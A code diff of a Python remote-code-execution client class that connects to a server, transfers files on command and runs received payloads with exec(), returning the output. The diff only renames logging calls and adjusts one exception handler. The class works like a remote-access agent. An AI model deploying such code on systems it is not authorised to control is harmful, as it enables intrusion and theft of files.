@@ -18,10 +18,10 @@ class RCEClient(BaseClientThread):
         self.__logger = Logger(self.__class__.__name__, debug)
         try:
             self.connect_to_server(host, port)
-            self.__logger.info(f"Connected to {host}:{port}")
+            self.__logger.on_info(f"Connected to {host}:{port}")
         except ConnectionRefusedError as e:
-            self.__logger.error(f"Failed to connect to {host}:{port}")
-            self.__logger.debug(f"[REASON] {e}")
+            self.__logger.on_error(f"Failed to connect to {host}:{port}")
+            self.__logger.on_debug(f"[REASON] {e}")
             exit(1)
 
     def run(self):
@@ -29,7 +29,7 @@ class RCEClient(BaseClientThread):
         Runs the client thread which handles incoming messages from the server and performs actions based on the
         message type.
         """
-        self.__logger.info("Listening for messages...")
+        self.__logger.on_info("Listening for messages...")
         while self.is_connected():
             try:
                 message = self.receive_message()
@@ -37,35 +37,35 @@ class RCEClient(BaseClientThread):
                     raise OSError("RECEIVED DISCONNECT")
 
                 if message.is_type(MessageType.ECHO):
-                    self.__logger.info(message.data.decode())
+                    self.__logger.on_info(message.data.decode())
                     self.send_message(message)
                 elif message.is_type(MessageType.FILE_UPLOAD):
-                    self.__logger.debug("Receiving file...")
+                    self.__logger.on_debug("Receiving file...")
                     file_path = Path(message.data.decode())
                     self.receive_file(file_path.name, file_path.parent)
-                    self.__logger.info(f"File '{file_path}' received")
+                    self.__logger.on_info(f"File '{file_path}' received")
                 elif message.is_type(MessageType.FILE_DOWNLOAD):
-                    self.__logger.debug("Sending file...")
+                    self.__logger.on_debug("Sending file...")
                     filename = message.data.decode()
                     self.send_file(filename)
-                    self.__logger.debug(f"File '{filename}' sent")
+                    self.__logger.on_debug(f"File '{filename}' sent")
                 elif message.is_type(MessageType.INJECT):
-                    self.__logger.debug(f"injecting:\n\t{message}")
+                    self.__logger.on_debug(f"injecting:\n\t{message}")
                     self.inject_payload(message)
                 elif message.is_type(MessageType.EXECUTE):
-                    self.__logger.debug(f"executing:\n\t{message}")
+                    self.__logger.on_debug(f"executing:\n\t{message}")
                     self.execute_payload()
                 elif message.is_type(MessageType.ERROR):
-                    self.__logger.debug(f"error:\n\t{message}")
+                    self.__logger.on_debug(f"error:\n\t{message}")
                 else:
-                    self.__logger.debug(f"Unknown message type: {message.get_type()}")
+                    self.__logger.on_debug(f"Unknown message type: {message.get_type()}")
             except (FileNotFoundError, MessageTypeError, FileWriteError, FileReadError) as e:
-                self.__logger.error(e)
+                self.__logger.on_error(e)
                 self.send_message(Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
             except OSError as e:
                 self.close()
-                self.__logger.error("DISCONNECTED from server")
-                self.__logger.debug(f"[REASON] {e}")
+                self.__logger.on_error("DISCONNECTED from server")
+                self.__logger.on_debug(f"[REASON] {e}")
                 break
 
     # noinspection PyMethodMayBeStatic
@@ -87,14 +87,14 @@ class RCEClient(BaseClientThread):
         :param message: The message containing the payload to be injected.
         """
         received_payload = message.data
-        self.__logger.debug("Injecting payload:\n" + received_payload.decode())
+        self.__logger.on_debug("Injecting payload:\n" + received_payload.decode())
         try:
             exec(received_payload, locals(), globals())
             setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
-            self.__logger.debug("Injected payload")
+            self.__logger.on_debug("Injected payload")
             self.send_message(Message(message_type=MessageType.ECHO, data=b"Payload injected"))
         except AttributeError as e:
-            self.__logger.error(e)
+            self.__logger.on_error(e)
             self.send_message(Message(MessageType.ERROR, traceback.format_exc().encode()))
 
     def execute_payload(self):
@@ -108,12 +108,12 @@ class RCEClient(BaseClientThread):
                 return
 
             output = str(output)
-            self.__logger.debug(f"Output from payload execution:\n{output}")
+            self.__logger.on_debug(f"Output from payload execution:\n{output}")
             self.send_message(
                 Message(message_type=MessageType.ECHO, data=output.encode()))
         except OSError:
-            self.__logger.error("Connection closed by peer")
-        except Exception as e:
-            self.__logger.debug(e)
+            self.__logger.on_error("Connection closed by peer")
+        except Exception:
+            self.__logger.on_debug(traceback.format_exc())
             self.send_message(
                 Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
